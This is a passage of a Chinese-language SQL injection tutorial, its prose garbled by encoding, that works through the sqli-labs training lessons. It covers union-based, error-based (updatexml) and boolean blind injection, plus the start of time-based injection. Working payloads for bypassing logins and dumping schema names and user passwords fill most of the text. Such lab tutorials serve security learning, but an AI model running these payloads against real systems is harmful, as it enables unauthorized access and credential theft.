<p>å¯ä»¥è¿›è¡Œæ•°æ®çš„æŸ¥è¯¢</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(username,0x7e,password) from security.users--+</code></p>
</blockquote>
<p>0x7eæ˜¯ç¬¦å· ï½ çš„16è¿›åˆ¶</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b23fae72-deb4-49b6-a2a7-21f28e1662a2/Untitled.png" alt="Untitled"></p>
<p>æŸ¥è¯¢åˆ°æ‰€æœ‰è¡¨ä¸­çš„æ•°æ®</p>
<h2 id="ä¸ƒã€æŠ¥é”™æ³¨å…¥"><a href="#ä¸ƒã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="ä¸ƒã€æŠ¥é”™æ³¨å…¥"></a>ä¸ƒã€æŠ¥é”™æ³¨å…¥</h2><p>æŠ¥é”™æ³¨å…¥æ˜¯é€šè¿‡ä½¿ç”¨ç‰¹æ®Šçš„å‡½æ•°æ„é€ payloadï¼Œä½¿åå°çš„SQLè¯­å¥æ‰§è¡Œæ—¶å‡ºé”™ï¼Œå¹¶å°†æŠ¥é”™ä¿¡æ¯å›æ˜¾åœ¨é¡µé¢ä¸Šï¼Œè¦æŸ¥è¯¢çš„ä¿¡æ¯ä¹Ÿä¼šéšç€æŠ¥é”™ä¿¡æ¯å›æ˜¾</p>
<p><a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p>
<p>ä¹‹å‰è¾“å…¥å•å¼•å·è¿›è¡ŒæŠ¥é”™ï¼Œä»è€Œåˆ¤æ–­é—­åˆæ–¹å¼çš„ï¼Œä¹Ÿæ˜¯ä¸€ç§æŠ¥é”™</p>
<aside>

<p>ğŸ’¡ ä»è¿™é‡Œå°±å¯ä»¥çœ‹å‡ºæŠ¥é”™æ³¨å…¥çš„é™åˆ¶ï¼Œå¿…é¡»è¦æ±‚ç½‘ç«™èƒ½å°†æŠ¥é”™ä¿¡æ¯è¯¦ç»†çš„å›æ˜¾åˆ°é¡µé¢ä¸Š</p>
</aside>

<p><strong>Xpathè¯­æ³•é”™è¯¯ï¼š</strong><code>extractvalue()</code>ã€<code>updatexml()</code></p>
<h3 id="1ã€åˆ¤æ–­é—­åˆ-1"><a href="#1ã€åˆ¤æ–­é—­åˆ-1" class="headerlink" title="1ã€åˆ¤æ–­é—­åˆ"></a>1ã€åˆ¤æ–­é—­åˆ</h3><p>ä¼ å€¼</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7bfc4e68-7c8b-43b6-81af-81e2c6bf3506/Untitled.png" alt="Untitled"></p>
<p>é€šè¿‡é¡µé¢æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰é¡µé¢ä½¿ç”¨äº†å•å¼•å·è¿›è¡Œé—­åˆ</p>
<h3 id="2ã€åˆ¤æ–­åˆ—æ•°-1"><a href="#2ã€åˆ¤æ–­åˆ—æ•°-1" class="headerlink" title="2ã€åˆ¤æ–­åˆ—æ•°"></a><del>2ã€åˆ¤æ–­åˆ—æ•°</del></h3><aside>

<p>âš ï¸ <del>ç”±äºå¹¶ä¸ä½¿ç”¨é¡µé¢æœ¬èº«çš„å›æ˜¾ï¼Œè¿™é‡Œä¸éœ€è¦åˆ¤æ–­åˆ—æ•°</del></p>
</aside>

<p><del>åˆ†åˆ«ä¼ å€¼</del></p>
<blockquote>
<p><del>uname&#x3D;~~~~&#96;admin<code>~~~~&amp;passwd=~~~~</code>â€˜order by 1â€“+<br><code>~~~~uname=~~~~</code>admin<code>~~~~&amp;passwd=~~~~</code>â€˜order by 2â€“+<br><code>~~~~uname=~~~~</code>admin<code>~~~~&amp;passwd=~~~~</code>â€˜order by 3â€“+&#96;</del></p>
</blockquote>
<p><del>å½“ä¼ å…¥å€¼ä¸º1å’Œ2æ—¶ï¼Œé¡µé¢å“åº”æ­£å¸¸ã€‚</del></p>
<p><del>å½“ä¼ å…¥å€¼ä¸º3æ—¶ï¼Œé¡µé¢æŠ¥é”™æç¤º~~~~&#96;Unknown column â€˜3â€™ in â€˜order clauseâ€™&#96;</del></p>
<p><del>è¡¨ç¤ºåœ¨å½“å‰çš„æŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µ</del></p>
<h3 id="3ã€æŸ¥è¯¢æ•°æ®åº“"><a href="#3ã€æŸ¥è¯¢æ•°æ®åº“" class="headerlink" title="3ã€æŸ¥è¯¢æ•°æ®åº“"></a>3ã€æŸ¥è¯¢æ•°æ®åº“</h3><p>æŠ¥é”™æ³¨å…¥å¹¶ä¸ä½¿ç”¨æŸ¥è¯¢çš„å›æ˜¾ä½ç½®è¿›è¡Œå›æ˜¾ï¼Œå› æ­¤ä¸éœ€è¦åˆ¤æ–­æŸ¥è¯¢çš„å›æ˜¾ä½ç½®</p>
<p>ä½¿ç”¨ä»¥ä¸‹è¯­å¥æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3)--+</code></p>
</blockquote>
<h3 id="âš ï¸-æŸ¥è¯¢æ•°æ®ä¸å…¨"><a href="#âš ï¸-æŸ¥è¯¢æ•°æ®ä¸å…¨" class="headerlink" title="âš ï¸Â æŸ¥è¯¢æ•°æ®ä¸å…¨"></a>âš ï¸Â æŸ¥è¯¢æ•°æ®ä¸å…¨</h3><p>æ­¤æ—¶å¯ä»¥å‘ç°æŸ¥è¯¢å‡ºçš„æ•°æ®åº“ä¿¡æ¯ä¸å…¨</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/00a75786-8d25-4aba-83ba-939f7c68c6a6/Untitled.png" alt="Untitled"></p>
<p>è¿™é‡Œæ˜¯ç”±äº<code>extractvalue()</code>å’Œ<code>updatexml()</code>æœ€å¤šåªèƒ½æŠ¥32ä¸ªå­—çš„é”™è¯¯ï¼Œå…¶ä½™çš„éƒ½è¢«çœç•¥äº†</p>
<p>è¦æƒ³å…¶ä½™è¢«çœç•¥çš„ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ï¼Œå¯ä»¥ä½¿ç”¨whereå­å¥æ·»åŠ æ¡ä»¶é™åˆ¶è¾“å‡ºç»“æœ</p>
<p>ä¾‹å¦‚åœ¨æ­¤å¤„ï¼Œè‹¥æ˜¯æƒ³è¦æŸ¥è¯¢å…¶ä»–æ•°æ®åº“åï¼Œå¯æ·»åŠ å­å¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> schema_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;information_schema&#x27;</span>,<span class="string">&#x27;challenges&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata where schema_name not in (&#39;information_schema&#39;,&#39;challenges&#39;))),3)--+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a4aac31-6833-4573-981c-ac7998c6f3a3/Untitled.png" alt="Untitled"></p>
<p>å°†å·²çŸ¥ç»“æœæ’é™¤åœ¨å¤–ï¼Œä¾¿å¯çœ‹åˆ°æ–°çš„ç»“æœ</p>
<h3 id="4ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨"><a href="#4ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨" class="headerlink" title="4ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨"></a>4ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨</h3><p>è¿™é‡Œæ¥æŸ¥è¯¢<code>security</code>æ•°æ®åº“å†…çš„è¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),3) --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf776d6f-237a-4ef3-aa65-ceadff18b349/Untitled.png" alt="Untitled"></p>
<p>è‹¥æ˜¯æ•°æ®æ˜¾ç¤ºä¸å…¨ï¼Œåˆ™ä½¿ç”¨<code>where</code>å­å¥è¿›è¡Œé™åˆ¶</p>
<p>è‹¥è¦æŸ¥è¯¢å…¶ä»–æ•°æ®åº“å†…çš„è¡¨ï¼Œåˆ™æ›´æ¢<code>table_schema</code>çš„å€¼å³å¯</p>
<h3 id="5ã€æŸ¥è¯¢è¡¨å†…å­—æ®µ"><a href="#5ã€æŸ¥è¯¢è¡¨å†…å­—æ®µ" class="headerlink" title="5ã€æŸ¥è¯¢è¡¨å†…å­—æ®µ"></a>5ã€æŸ¥è¯¢è¡¨å†…å­—æ®µ</h3><p>è¿™é‡Œæ¥æŸ¥è¯¢è¡¨<code>security.users</code> å†…çš„å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)),3)--+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d9c6276-8f12-42ee-80c2-5d6a3fc3bd66/Untitled.png" alt="Untitled"></p>
<p>è¿™é‡Œéœ€è¦åŠ ä¸Š<code>table_schema</code>æ¥é™åˆ¶æ•°æ®åº“ï¼Œå¦åˆ™ä¼šå°†æ•°æ®åº“ä¸­æ‰€æœ‰çš„userè¡¨å†…å­—æ®µéƒ½æŸ¥è¯¢å‡ºæ¥</p>
<p>è‹¥æ˜¯æ•°æ®æ˜¾ç¤ºä¸å…¨ï¼Œåˆ™ä½¿ç”¨<code>where</code>å­å¥è¿›è¡Œé™åˆ¶</p>
<p>è‹¥è¦æŸ¥è¯¢å…¶ä»–æ•°æ®åº“å†…çš„è¡¨ï¼Œåˆ™æ›´æ¢<code>table_schema</code>å’Œ<code>table_name</code>çš„å€¼å³å¯</p>
<h3 id="6ã€æŸ¥è¯¢æ•°æ®"><a href="#6ã€æŸ¥è¯¢æ•°æ®" class="headerlink" title="6ã€æŸ¥è¯¢æ•°æ®"></a>6ã€æŸ¥è¯¢æ•°æ®</h3><p>æ­¤æ—¶å·²ç»è·å–åˆ°äº†security.usersè¡¨ç»“æ„</p>
<p>å¯ä»¥è¿›è¡Œæ•°æ®çš„æŸ¥è¯¢</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x7e,password) from security.users)),3) --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/10b5475b-8488-4caf-bb37-c1cc55ee3e1c/Untitled.png" alt="Untitled"></p>
<p>è‹¥è¦æ˜¾ç¤ºå…¶ä»–çš„æ•°æ®ï¼Œåˆ™å¯é€šè¿‡whereå­å¥è¿›è¡Œé™åˆ¶</p>
<h2 id="å…«ã€å¸ƒå°”ç›²æ³¨"><a href="#å…«ã€å¸ƒå°”ç›²æ³¨" class="headerlink" title="å…«ã€å¸ƒå°”ç›²æ³¨"></a>å…«ã€å¸ƒå°”ç›²æ³¨</h2><p>ç›²æ³¨ï¼Œåˆ™æ˜¯åœ¨é¡µé¢æ²¡æœ‰å›æ˜¾æˆ–å›æ˜¾ä¸è¶³ä»¥è·å–æ•°æ®çš„æƒ…å†µä¸‹å¯ä»¥é€‰æ‹©ä½¿ç”¨çš„æ³¨å…¥æ–¹æ³•</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>ç™»é™†æˆåŠŸä¸å¦éƒ½ä¸ä¼šå›æ˜¾ä»»ä½•æ•°æ®åº“ç›¸å…³çš„å€¼</li>
<li>æ²¡æœ‰æŠ¥é”™ä¿¡æ¯å›æ˜¾</li>
<li>æŠ¥é”™ä¿¡æ¯å›æ˜¾è¿‡äºç®€å•</li>
</ul>
<p>å¸ƒå°”ç›²æ³¨çš„åŸºæœ¬åŸç†æ˜¯ï¼šé€šè¿‡åˆ¤æ–­é¡µé¢å¯¹æ‰€æ„é€ çš„å¸ƒå°”è¡¨è¾¾å¼æ­£ç¡®æˆ–é”™è¯¯çš„å“åº”ï¼Œæ¨æ–­å‡ºæƒ³å¾—åˆ°çš„æ•°æ®</p>
<aside>

<p>ğŸ’¡ <code>uname=admin</code>&amp;<code>passwd=&#39;or&#39;1&#39;=&#39;1</code></p>
</aside>

<p>åœ¨ä¸‡èƒ½å¯†ç ä¸­å°±å¯ä»¥çœ‹åˆ°å¸ƒå°”ç›²æ³¨çš„å½±å­</p>
<p>é€šè¿‡æ„é€ æ°¸çœŸè¡¨è¾¾å¼ï¼Œæ¥ç»•è¿‡ç™»é™†éªŒè¯</p>
<p>è‹¥å°†1&#x3D;1æ›¿æ¢ä¸º1&#x3D;2è¿™æ ·çš„æ°¸å‡å¼ï¼Œä¾¿ä¸èƒ½æˆåŠŸç™»é™†äº†</p>
<p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ï¼Œå½“åæ–¹è¡¨è¾¾å¼ä¸ºçœŸï¼Œåˆ™ç™»é™†æˆåŠŸ;è‹¥è¡¨è¾¾å¼ä¸ºå‡ï¼Œåˆ™ç™»é™†å¤±è´¥</p>
<p>è¿™æ ·å°±å¯ä»¥é€šè¿‡æ„é€ ç±»ä¼¼äº<code>database()=&#39;security&#39;</code> è¿™æ ·çš„è¡¨è¾¾å¼ï¼Œæ¥è¿›è¡Œæ•°æ®åº“ç»“æ„çš„æ¨æµ‹</p>
<h3 id="1ã€åˆ¤æ–­é—­åˆ-2"><a href="#1ã€åˆ¤æ–­é—­åˆ-2" class="headerlink" title="1ã€åˆ¤æ–­é—­åˆ"></a>1ã€åˆ¤æ–­é—­åˆ</h3><p>ç”±äºç¯å¢ƒæ¡ä»¶çš„é™åˆ¶ï¼Œæ–­ç„¶ä¸å¯èƒ½ä½¿ç”¨ä¹‹å‰çš„è§‚å¯ŸæŠ¥é”™ä¿¡æ¯çš„æ–¹æ³•æ¥åˆ¤æ–­é—­åˆæ–¹å¼</p>
<p>å¯ä»¥é‡‡ç”¨æ°¸çœŸå’Œæ°¸å‡è¡¨è¾¾å¼æ¥åˆ¤æ–­</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-15/">http://10.211.55.6/sqli-labs/Less-15/</a></p>
<blockquote>
<p><code>uname=admin&amp;passwd=a&#39;or&#39;1&#39;=&#39;1</code>  # é¡µé¢è¿”å›æˆåŠŸ<br><code>uname=admin&amp;passwd=a&#39;or&#39;1&#39;=&#39;2</code>  # é¡µé¢è¿”å›å¤±è´¥</p>
</blockquote>
<p>åˆ™è¡¨æ˜ä½¿ç”¨äº†å•å¼•å·è¿›è¡Œé—­åˆï¼ŒåŒæ—¶è¿˜èƒ½å¾—åˆ°<code>æ­£ç¡®</code>å’Œ<code>é”™è¯¯</code>çš„ä¸åŒå“åº”é¡µé¢</p>
<h3 id="2ã€åˆ¤æ–­æ­£ç¡®å’Œé”™è¯¯å“åº”"><a href="#2ã€åˆ¤æ–­æ­£ç¡®å’Œé”™è¯¯å“åº”" class="headerlink" title="2ã€åˆ¤æ–­æ­£ç¡®å’Œé”™è¯¯å“åº”"></a>2ã€åˆ¤æ–­æ­£ç¡®å’Œé”™è¯¯å“åº”</h3><p>é€šè¿‡ä¼ å…¥æ°¸çœŸå¼å’Œæ°¸å‡å¼å¾—åˆ°æ­£ç¡®å’Œé”™è¯¯çš„ç›¸åº”é¡µé¢</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or&#39;1&#39;=&#39;1</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/51771881-a5e6-4100-9961-8dce8e95ce76/Untitled.png" alt="Untitled"></p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or&#39;1&#39;=&#39;2</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c0e0238a-ddb6-4ef5-b2de-b889c150c95c/Untitled.png" alt="Untitled"></p>
<p>å¯ä¸ä¸Šä¸€æ­¥åˆ¤æ–­é—­åˆä¸€èµ·è¿›è¡Œ</p>
<h3 id="3ã€åˆ¤æ–­æ•°æ®åº“æ•°é‡"><a href="#3ã€åˆ¤æ–­æ•°æ®åº“æ•°é‡" class="headerlink" title="3ã€åˆ¤æ–­æ•°æ®åº“æ•°é‡"></a>3ã€åˆ¤æ–­æ•°æ®åº“æ•°é‡</h3><p>è¯¥æ­¥éª¤å¯æœ‰å¯æ— </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=1--+</code>  # é”™è¯¯<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=2--+</code>  # é”™è¯¯<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=3--+</code>  # é”™è¯¯<br>â€¦â€¦<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=7--+</code>  # é”™è¯¯<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=8--+</code>  # é”™è¯¯<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=9--+</code>  # æ­£ç¡®</p>
</blockquote>
<p>é™¤äº†ç­‰å·ï¼Œå…¶ä»–ç¬¦å·ä¹Ÿå¯ä»¥è¿›è¡Œåˆ¤æ–­ <code>&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code> <code>LIKE</code> </p>
<blockquote>
<p>1â€“+<code>  # æ­£ç¡® uname=</code>admin<code>&amp;passwd=</code>aâ€™or (SELECT count(schema_name) from information_schema.schemata)10â€“+<code>  # é”™è¯¯ uname=</code>admin<code>&amp;passwd=</code>aâ€™or (SELECT count(schema_name) from information_schema.schemata)5â€“+<code>  # æ­£ç¡® uname=</code>admin<code>&amp;passwd=</code>aâ€™or (SELECT count(schema_name) from information_schema.schemata)7â€“+<code>  # æ­£ç¡® uname=</code>admin<code>&amp;passwd=</code>aâ€™or (SELECT count(schema_name) from information_schema.schemata)9â€“+&#96;  # æ­£ç¡®</p>
</blockquote>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata) LIKE 8--+</code>  # é”™è¯¯<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata) LIKE 9--+</code>  # æ­£ç¡®</p>
</blockquote>
<h3 id="4ã€åˆ¤æ–­æ•°æ®åº“"><a href="#4ã€åˆ¤æ–­æ•°æ®åº“" class="headerlink" title="4ã€åˆ¤æ–­æ•°æ®åº“"></a>4ã€åˆ¤æ–­æ•°æ®åº“</h3><p>ä½¿ç”¨<code>limit</code>å…³é”®å­—æ¥é™åˆ¶è¾“å‡º</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å­—ç¬¦ä¸²å¤„ç†å‡½æ•°è·å–æŸä¸€ä½çš„å­—ç¬¦</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>((<span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰ï¼š<code>right()</code> <code>left()</code> <code>MID()</code> <code>reverse()</code> <code>RPAD()</code> ç­‰</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),1) LIKE &#39;s&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),2)=&#39;se&#39;--+ </code>â€¦â€¦<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),8)=&#39;security&#39;--+</code></p>
</blockquote>
<h3 id="5ã€åˆ¤æ–­è¡¨å"><a href="#5ã€åˆ¤æ–­è¡¨å" class="headerlink" title="5ã€åˆ¤æ–­è¡¨å"></a>5ã€åˆ¤æ–­è¡¨å</h3><p>æŸ¥è¯¢æ•°æ®åº“securityä¸­çš„è¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­è¡¨å</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1),1)=&#39;e&#39;--+ </code>â€¦â€¦<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 3,1),1)=&#39;u&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 3,1),5)=&#39;users&#39;--+</code></p>
</blockquote>
<p>ä¸æ–­æ¨æµ‹å‡ºå…¶ä»–çš„è¡¨å</p>
<h3 id="6ã€åˆ¤æ–­åˆ—å"><a href="#6ã€åˆ¤æ–­åˆ—å" class="headerlink" title="6ã€åˆ¤æ–­åˆ—å"></a>6ã€åˆ¤æ–­åˆ—å</h3><p>æŸ¥è¯¢security.usersè¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 0,1),1)=&#39;i&#39;--+ </code>â€¦â€¦.<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 1,1),8)=&#39;username&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 2,1),8)=&#39;password&#39;--+</code></p>
</blockquote>
<h3 id="7ã€çŒœæµ‹æ•°æ®"><a href="#7ã€çŒœæµ‹æ•°æ®" class="headerlink" title="7ã€çŒœæµ‹æ•°æ®"></a>7ã€çŒœæµ‹æ•°æ®</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password) <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT username from security.users LIMIT 0,1),1)=&#39;d&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT concat_ws(&#39;:&#39;,username,password) from security.users LIMIT 0,1),9)=&#39;dumb:dumb&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) from security.users),14)=&#39;dumb:dumb,ange&#39;--+</code></p>
</blockquote>
<h2 id="ä¹ã€æ—¶é—´ç›²æ³¨"><a href="#ä¹ã€æ—¶é—´ç›²æ³¨" class="headerlink" title="ä¹ã€æ—¶é—´ç›²æ³¨"></a>ä¹ã€æ—¶é—´ç›²æ³¨</h2><p>å¸ƒå°”ç›²æ³¨é€‚ç”¨äºæœ‰é”™è¯¯ä¸æ­£ç¡®ä¸åŒå“åº”çš„é¡µé¢ï¼Œè€Œå¯¹äºé‚£äº›æ— è®ºå¯¹é”™ï¼Œé¡µé¢å“åº”å§‹ç»ˆä¸å˜çš„ç½‘ç«™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<p>æ—¶é—´ç›²æ³¨çš„åŸºæœ¬åŸç†å’Œå¸ƒå°”æ³¨å…¥ç›¸å·®ä¸å¤šï¼Œä½¿ç”¨<code>ifè¯­å¥</code>ä»¥åŠ<code>sleepå‡½æ•°</code>ï¼Œæ„é€ å¸ƒå°”è¡¨è¾¾å¼ï¼Œå½“å¸ƒå°”è¡¨è¾¾å¼æ­£ç¡®æ—¶ï¼Œåˆ™æ‰§è¡Œ<code>sleepå‡½æ•°</code></p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-9/">http://10.211.55.6/sqli-labs/Less-9/</a></p>
<blockquote>
<p>?id&#x3D;<code>1&#39;and&#39;1&#39;=&#39;1 </code>?id&#x3D;<code>1&#39;and&#39;1&#39;=&#39;2</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95740020-1501-4094-bc00-8dcafb4974c6/Untitled.png" alt="Untitled"></p>
<p>å¯ä»¥çœ‹åˆ°æ— è®ºå¸ƒå°”è¡¨è¾¾å¼æ˜¯å¦ä¸ºTrueï¼Œé¡µé¢å“åº”éƒ½ä¸å˜ï¼Œæ­¤æ—¶å†ä½¿ç”¨å¸ƒå°”ç›²æ³¨å°±ä¸åˆé€‚äº†</p>
<blockquote>
